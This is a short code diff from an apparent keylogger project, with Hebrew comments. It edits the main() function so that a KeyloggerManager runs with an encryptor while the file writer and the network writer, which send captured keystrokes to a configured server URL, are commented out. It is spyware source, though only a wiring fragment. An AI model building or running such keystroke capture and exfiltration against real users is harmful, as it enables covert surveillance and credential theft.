@@ -13,15 +13,16 @@ def main():
         encryption_key = hash(encryption_key) % 65536  # המר למספר
     
     encryptor = Encryptor(key=encryption_key)
-    file_writer = FileWriter(Config.LOG_DIRECTORY)
-    network_writer = NetworkWriter(key=encryption_key, server_url=Config.SERVER_URL)
+    # file_writer = FileWriter(Config.LOG_DIRECTORY)  
+    # network_writer = NetworkWriter(key=encryption_key, server_url=Config.SERVER_URL)
     keylogger = Keyloggerservice()
     
     manager = KeyloggerManager(
         keylogger_service=keylogger, 
-        file_writer=file_writer,     
-        network_writer=network_writer,
-        encryptor=encryptor         
+        encryptor=encryptor,
+        # file_writer=file_writer, 
+        # network_writer=network_writer
+
     )
     
     print("🚀 KeyLogger Manager התחיל לרוץ...")
